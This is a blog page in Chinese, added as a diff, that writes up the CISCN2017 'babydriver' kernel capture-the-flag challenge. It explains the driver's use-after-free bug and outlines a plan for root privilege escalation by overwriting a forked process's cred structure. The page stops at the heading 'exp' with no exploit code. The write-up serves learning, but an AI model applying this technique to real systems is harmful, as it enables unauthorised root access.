@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Kernel UAF 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Kernel UAF</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-03-24 20:13:45
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Kernel/" title="Kernel">
+                    #Kernel
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="kernel-UAF"><a href="#kernel-UAF" class="headerlink" title="kernel UAF"></a>kernel UAF</h1><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h2><p>题目提供3个文件：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325104250920.png"></p>
+<p>boot.sh:启动脚本</p>
+<p>bzImage:kernel镜像</p>
+<p>rootfs.cpio:文件系统映像</p>
+<p><strong>1、执行boot.sh，启动qemu虚拟机</strong></p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325104725384.png" style="zoom:67%;" />
+
+<p>查看init初始化脚本</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325105109412.png" style="zoom:67%;" />
+
+<p>&#x3D;&#x3D;》flag需要root权限才能查看&#x3D;&#x3D;》提权</p>
+<p>&#x3D;&#x3D;》insmod用于将给定的模块加载至内核中&#x3D;&#x3D;》</p>
+<p>查看所有进入内核的模块列表：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325105305294.png"></p>
+<p>&#x3D;&#x3D;》babydrive被加载进kernel中，并且显示了加载的地址&#x3D;&#x3D;》</p>
+<p><strong>2、对babydrive.ko文件进行分析：</strong></p>
+<p>1、将rootfs.cpio文件系统映像解包</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> fs
+<span class="token builtin class-name">cd</span> fs
+<span class="token function">cp</span> <span class="token punctuation">..</span>/rootfs.cpio ./rootfs.cpio.gz
+gunzip ./rootfs.cpio.gz 
+cpio <span class="token parameter variable">-idmv</span> <span class="token operator">&lt;</span> rootfs.cpio
+<span class="token function">rm</span> rootfs.cpio</code></pre>
+
+<p>运行dec.sh&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325105833654.png"></p>
+<p>2、获取babydriver.ko文件，</p>
+<h3 id="查看文件属性"><a href="#查看文件属性" class="headerlink" title="查看文件属性"></a>查看文件属性</h3><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325110031416.png"></p>
+<h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><h4 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init"></a>babydriver_init</h4><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325150528776.png" style="zoom:67%;" />
+
+<p>&#x3D;&#x3D;》</p>
+<p>设备号：对于所有设备来说，分为3种：</p>
+<p>字符设备&#x3D;》例：控制台</p>
+<p>块设备&#x3D;》例：文件系统</p>
+<p>网络设备&#x3D;》例：网卡</p>
+<p>设备文件可以通过设备文件名来访问，通常位于&#x2F;dev下</p>
+<pre class="language-none"><code class="language-none">ls -a
+c表示字符设备
+l表示符号链接
+-表示常规文件</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325132714420.png"></p>
+<p>&#x3D;&#x3D;》</p>
+<p>可以在设备文件条目种最后一次修改日期之前例248， 0&#x3D;&#x3D;》分别是主设备号与副设备号</p>
+<p>&#x3D;&#x3D;》主设备号标识与设备相关的驱动程序</p>
+<p>例：&#x2F;dev&#x2F;null和&#x2F;dev&#x2F;zero都是由驱动1管理的，多个串行终端（ttyX，ttySX）是由驱动4管理的</p>
+<p>&#x3D;&#x3D;》内核使用副设备号来确定引用哪个设备</p>
+<p>&#x3D;&#x3D;》主设备号和副设备号可同时被保存在类型dev_t中，而该类型实际上是一个u32&#x3D;&#x3D;》</p>
+<p>12位用于保存主设备号，20位用于保存副设备号</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> u32 __kernel_dev_t<span class="token punctuation">;</span>
+<span class="token keyword">typedef</span> __kernel_dev_t    <span class="token class-name">dev_t</span><span class="token punctuation">;</span></code></pre>
+
+<p>&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</p>
+<p>&#x3D;&#x3D;&#x3D;》babydriver_init函数会调用alloc_chrdev_region函数&#x3D;&#x3D;》</p>
+<p>babydriver_init函数尝试向内核申请一个字符设备的新的主设备号，副设备号从0开始，设备名称为babydev</p>
+<p>，并将申请到的主副设备号存入babydev_no全局变量中</p>
+<p>&#x3D;&#x3D;》还调用了unregister_chrdev_region函数</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325135003669.png"></p>
+<p>&#x3D;&#x3D;》函数在调用时需要指定主副设备号的起始值，要求内核在起始值的基础上进行分配</p>
+<p>&#x3D;&#x3D;》设备号分配完后，将其连接至设备操作的内部函数</p>
+<p>内核使用cdev类型的结构来标识字符设备&#x3D;&#x3D;》在操作设备之前，内核必须初始化+注册一个这样的结构体</p>
+<p>（一个驱动程序可以分配不止一个设备号，创建不止一个设备）</p>
+<p><strong>初始化cedv结构体：</strong></p>
+<pre class="language-none"><code class="language-none">cdev_init(&amp;cdev_0, &amp;fops);</code></pre>
+
+<p>cedv结构体的初始化函数函数声明：</p>
+<pre class="language-none"><code class="language-none">void cdev_init(struct cdev *cdev, const struct file_operations *fops)</code></pre>
+
+<p>传入cdev指针对应的struct cdev将会被初始化，同时设置该设备的各类操作为传入的</p>
+<p>file_operations结构体指针</p>
+<p>file_operations结构体包含的函数指针：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">file_operations</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">module</span> <span class="token operator">*</span>owner<span class="token punctuation">;</span>
+  <span class="token class-name">loff_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>llseek<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>read<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>write<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>read_iter<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kiocb</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">iov_iter</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>write_iter<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kiocb</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">iov_iter</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>iopoll<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kiocb</span> <span class="token operator">*</span>kiocb<span class="token punctuation">,</span> bool spin<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>iterate<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dir_context</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>iterate_shared<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">dir_context</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__poll_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>poll<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">poll_table_struct</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">long</span> <span class="token punctuation">(</span><span class="token operator">*</span>unlocked_ioctl<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">long</span> <span class="token punctuation">(</span><span class="token operator">*</span>compat_ioctl<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>mmap<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> mmap_supported_flags<span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>open<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>flush<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">fl_owner_t</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>release<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fsync<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span><span class="token punctuation">,</span> <span class="token keyword">int</span> datasync<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fasync<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>lock<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file_lock</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>sendpage<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token punctuation">(</span><span class="token operator">*</span>get_unmapped_area<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>check_flags<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>flock<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file_lock</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>splice_write<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_inode_info</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>splice_read<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_inode_info</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>setlease<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">long</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file_lock</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">long</span> <span class="token punctuation">(</span><span class="token operator">*</span>fallocate<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span> <span class="token keyword">int</span> mode<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> offset<span class="token punctuation">,</span>
+        <span class="token class-name">loff_t</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>show_fdinfo<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">CONFIG_MMU</span></span>
+  <span class="token keyword">unsigned</span> <span class="token punctuation">(</span><span class="token operator">*</span>mmap_capabilities<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+  <span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>copy_file_range<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span>
+      <span class="token class-name">loff_t</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token class-name">loff_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>remap_file_range<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file_in<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> pos_in<span class="token punctuation">,</span>
+           <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file_out<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> pos_out<span class="token punctuation">,</span>
+           <span class="token class-name">loff_t</span> len<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> remap_flags<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fadvise<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span><span class="token punctuation">,</span> <span class="token class-name">loff_t</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> __randomize_layout<span class="token punctuation">;</span></code></pre>
+
+
+
+<p>cdev结构体初始化完成后&#x3D;&#x3D;》<strong>使用cdev_add告诉内核该设备的设备号</strong></p>
+<pre class="language-none"><code class="language-none">cdev_add(&amp;cdev_0, babydev_no, 1);</code></pre>
+
+<p>函数声明：</p>
+<pre class="language-none"><code class="language-none">int cdev_add(struct cdev *p, dev_t dev, unsigned count)</code></pre>
+
+<p>&#x3D;&#x3D;》一旦cdev_add函数执行完毕，则当前cdev设备立即处于活动状态，其操作可以立即被内核调用</p>
+<p>&#x3D;&#x3D;》在编写驱动程序时，务必保证在驱动程序完全处理设备上的操作之后，最后调用cdev_add</p>
+<p><strong>将设备注册进sysfs</strong></p>
+<pre class="language-c" data-language="c"><code class="language-c">babydev_class <span class="token operator">=</span> <span class="token function">class_create</span><span class="token punctuation">(</span>THIS_MODULE<span class="token punctuation">,</span> <span class="token string">"babydev"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">device_create</span><span class="token punctuation">(</span>babydev_class<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> babydev_no<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"babydev"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>函数声明：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">class</span> <span class="token operator">*</span><span class="token function">__class_create</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">module</span> <span class="token operator">*</span>owner<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">,</span>
+           <span class="token keyword">struct</span> <span class="token class-name">lock_class_key</span> <span class="token operator">*</span>key<span class="token punctuation">)</span>
+    
+<span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span><span class="token function">device_create</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">class</span> <span class="token operator">*</span>class<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>parent<span class="token punctuation">,</span>
+           <span class="token class-name">dev_t</span> devt<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>drvdata<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>fmt<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span></code></pre>
+
+<p>在初始化时init函数通过class_create函数创建一个class类型的类，创建好后的类存放于sysfs下，可以在&#x2F;sys&#x2F;class中寻找到&#x3D;&#x3D;》</p>
+<p>再调用device_create函数，动态建立逻辑设备，对新逻辑设备进行初始化&#x3D;&#x3D;》</p>
+<p>还将其与第一个参数所对应的逻辑类相关联，并将此逻辑设备加到Linux内核系统的设备驱动程序模型中</p>
+<p>&#x3D;&#x3D;》函数会自动在&#x2F;sys&#x2F;devices&#x2F;virtual目录下创建新的逻辑设备目录，并在&#x2F;dev目录下创建与逻辑类对应的设备文件</p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;》便可以在&#x2F;dev中看到该设备</p>
+<h4 id="babydriver-init函数总结："><a href="#babydriver-init函数总结：" class="headerlink" title="babydriver_init函数总结："></a>babydriver_init函数总结：</h4><p>1、向内核申请了一个空闲的设备号</p>
+<p>2、声明一个cdev结构体，初始化并绑定设备号</p>
+<p>3、创建新的ctruct class，并将该设备号所对应的设备注册进sysfs</p>
+<h4 id="babydriver-exit"><a href="#babydriver-exit" class="headerlink" title="babydriver_exit"></a>babydriver_exit</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325150651804.png"></p>
+<p>将该释放的数据结构全部释放</p>
+<h4 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325153955976.png"></p>
+<p>在函数中定义了babydev_struct的结构体，其中包含了一个device_buf指针以及一个device_buf_len成员变量</p>
+<p>kmem_cache_alloc_trace函数分配内存的逻辑与kmlloc类似&#x3D;&#x3D;》</p>
+<h4 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325154933016.png"></p>
+<p>将babydev_sreuct.device_buf释放掉</p>
+<p>在释放完成后，没有对device_buf指针置空，没有设置device_buf_len为0</p>
+<h4 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325155521018.png"></p>
+<p>判断当前device_buf是否为空，将device_buf上的内存拷贝至用户空间的buffer内存</p>
+<h4 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220325155754588.png"></p>
+<p>类似于realloc：将原先的device_buf释放，并分配一块新的内存</p>
+<p>注意点：此时的device_buf_len不为babyopne中的64&#x3D;&#x3D;》大小可以被用户任意指定</p>
+<h3 id="思路总结与动态调试"><a href="#思路总结与动态调试" class="headerlink" title="思路总结与动态调试"></a>思路总结与动态调试</h3><p>1、babyrelease释放device_buf指针后没有置空，device_buf_len没有重置为0</p>
+<p>2、babyioctl可以让device_buf重新分配任意大小的内存</p>
+<p>3、当前内核模块中所有用到的变量都是全局变量</p>
+<p>&#x3D;&#x3D;》在babydev_struct中&#x3D;&#x3D;》打开两次设备，第二次分配的空间将会覆盖第一次&#x3D;&#x3D;》</p>
+<p>思路:</p>
+<p>打开两次设备，通过ioctl将babydev_sruct.device_buf大小修改为cred结构体的大小&#x3D;&#x3D;》</p>
+<p>释放第一个设备，fork出一个新的进程，这个新进程的cred结构体就会放在babydev_struct.device_buf所指向的内存区域&#x3D;&#x3D;》</p>
+<p>使用第二个描述符，调用write向此时的babydev_struct.device_buf中写入28个0，刚好覆盖至uid和gid，实现提权</p>
+<p>&#x3D;&#x3D;》</p>
+<p>exp：</p>
